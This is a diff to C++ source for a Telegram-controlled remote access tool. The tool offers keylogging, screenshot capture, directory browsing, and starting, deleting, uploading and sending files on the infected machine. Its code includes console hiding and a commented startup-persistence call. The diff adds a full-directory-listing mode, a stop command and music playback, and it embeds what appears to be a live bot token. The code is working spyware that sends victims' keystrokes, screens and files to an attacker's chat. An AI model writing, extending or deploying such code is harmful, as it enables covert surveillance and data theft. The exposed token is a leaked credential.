@@ -30,12 +30,14 @@ void startBot(std::string token)
 				+ "/send_scr - makes and sends screenshot;\n"
 				+ "/send_key_logger - sends a file with key logs;\n"
 				+ "/check_dir_mode - opens check directory mode;\n"
+				+ "/full_check_dir_mode - opens full check directory mode;\n"
 				+ "/start_file_mode - opens start file mode;\n"
 				+ "/delete_file_mode - opens delete file mode;\n"
 				+ "/copy_file_mode - opens copy file mode;\n"
 				+ "/send_file_mode - opens send file mode;\n"
 				+ "/upload_file_mode - opens upload file mode;\n"
-				+ "/conversation_mode - opens console conversation mode;\n"
+				+ "/play_music_mode - opens play music mode;\n"
+				+ "/stop_music - stops music;\n"
 				+ "/exit_mode - exits your current mode.\n");
 			bot.getApi().sendMessage(message->chat->id, "ChatID: " + std::to_string(message->chat->id));
 		}
@@ -45,7 +47,6 @@ void startBot(std::string token)
 		});
 
 
-	// Starting Key Logger
 	bot.getEvents().onCommand("start_key_logger", [&bot](TgBot::Message::Ptr message) {
 		if (currentMode == MODE_STANDARD)
 		{
@@ -62,7 +63,6 @@ void startBot(std::string token)
 		});
 
 
-	// Killing current Key Logger session
 	bot.getEvents().onCommand("kill_key_logger", [&bot](TgBot::Message::Ptr message) {
 		if (currentMode == MODE_STANDARD)
 		{
@@ -74,12 +74,16 @@ void startBot(std::string token)
 		});
 
 
-	// Sending a file with Key Logger records
 	bot.getEvents().onCommand("send_key_logger", [&bot](TgBot::Message::Ptr message) {
 		if (currentMode == MODE_STANDARD)
 		{
-			// Проверяем, не пустой ли файл
 			ifstream inFile(filename);
+
+			if (!inFile) {
+				bot.getApi().sendMessage(message->chat->id, "Error: Cannot open file!");
+				return;
+			}
+
 			if (inFile.peek() == std::ifstream::traits_type::eof())
 				bot.getApi().sendMessage(message->chat->id, "The file is empty.");
 			else
@@ -119,6 +123,17 @@ void startBot(std::string token)
 		{
 			bot.getApi().sendMessage(message->chat->id, "Send a path of directory you want to check.");
 			currentMode = MODE_CHECK_DIR;
+		}
+		else
+			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+		});
+
+
+	bot.getEvents().onCommand("full_check_dir_mode", [&bot](TgBot::Message::Ptr message) {
+		if (currentMode == MODE_STANDARD)
+		{
+			bot.getApi().sendMessage(message->chat->id, "Send a path of directory you want to check.");
+			currentMode = MODE_FULL_CHECK_DIR;
 		}
 		else
 			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
@@ -193,8 +208,7 @@ void startBot(std::string token)
 		});
 
 
-	// Experimental, DO NOT USE - IT'S NOT WORKING FOR NOW!
-	bot.getEvents().onCommand("conversation_mode", [&bot](TgBot::Message::Ptr message) {
+	/*bot.getEvents().onCommand("conversation_mode", [&bot](TgBot::Message::Ptr message) {
 
 		if (currentMode == MODE_STANDARD)
 		{
@@ -206,8 +220,12 @@ void startBot(std::string token)
 		}
 		else
 			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
-		});
+		});*/
 
+
+	bot.getEvents().onCommand("stop_bot", [&bot](TgBot::Message::Ptr message) {
+		exit(0);
+		});
 
 	// ALL messages from the user are processed here FIRST.
 	bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {
@@ -220,6 +238,7 @@ void startBot(std::string token)
 			isConversationRunning = false;
 			return;
 		}
+
 
 		else if (message->text == "/stop_music") {
 			if (isMusicPlaying)
@@ -243,6 +262,9 @@ void startBot(std::string token)
 		case MODE_CHECK_DIR:
 			checkDir(bot, message);
 			break;
+		case MODE_FULL_CHECK_DIR:
+			fullCheckDir(bot, message);
+			break;
 		case MODE_START_FILE:
 			startFile(bot, message);
 			break;
@@ -257,9 +279,6 @@ void startBot(std::string token)
 			break;
 		case MODE_UPLOAD_FILE:
 			uploadFile(bot, message);
-			break;
-		case MODE_CONVERSATION:
-			startConversation(bot, message);
 			break;
 		case MODE_PLAY_MUSIC:
 			playMusic(bot, message);
@@ -284,10 +303,12 @@ void startBot(std::string token)
 
 int main()
 {
-	HideConsole();
+	setlocale(LC_ALL, "Russian");
+	//HideConsole();
 
 	//AddToStartup(L"System", L"path\\to\\your\\program.exe");
 
-	startBot("TOKEN");
+	startBot("6507971490:AAEFE5H4m1KJvJwUXFDgM4cVHSSwTXx0uiU");
+
 	return 0;
 }
